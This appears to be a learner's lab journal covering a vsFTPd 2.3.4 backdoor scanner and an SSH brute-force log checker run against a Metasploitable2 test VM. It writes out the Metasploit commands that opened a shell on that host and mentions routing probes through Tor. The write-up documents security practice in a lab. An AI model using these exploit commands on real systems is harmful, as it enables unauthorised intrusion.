# Day 4: Phantom Scripts — Custom Exploit & Defense Automation

## OPSEC/Anonymity Notes
- All network scans or probes routed via Tor proxychains.
- Scripts developed and tested in a controlled, ethical environment.
- Date/time: (insert date/time)

---

## Offensive Script: phantom_attack.py

- Checks for vsFTPd 2.3.4 backdoor vulnerability (CVE-2011-2523).
- Example Output:
    ```
    [!] 192.168.56.101:21 appears vulnerable to vsFTPd 2.3.4 backdoor (CVE-2011-2523)
    ```
## Offensive Script: phantom_attack.py

- Target: 192.168.0.80 (Metasploitable2)
- Scan output:
    [!] 192.168.0.80:21 appears vulnerable to vsFTPd 2.3.4 backdoor (CVE-2011-2523)

- This matches the finding from Metasploit and validates both detection and reporting logic.

### vsFTPd 2.3.4 Backdoor Exploit (CVE-2011-2523)

Metasploit exploit used:
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.0.80
run
Result:
- Successfully exploited vsFTPd backdoor.
- Command shell session opened on Metasploitable2.
- Demonstrates risk of running outdated/vulnerable software in production.

---

## Defensive Script: phantom_defend.sh

- Scans system log for repeated SSH login failures (potential brute-force).
- Example Output:
    ```
    24 192.168.56.103
    17 192.168.56.102
    ```
- Recommendation: Block high-frequency offending IPs and enable fail2ban.

---

## Summary & Reflection

- **What I Learned:**  
  - How to quickly code custom security checks and automations for both offense and defense.
  - The value of scripting to speed up analysis and reduce manual effort.
- **Next Steps:**  
  - Expand exploit scripts for other common CVEs.
  - Automate alerts/response on defense scripts.

---

**All scripts and activities were developed and run ethically on local test systems.**
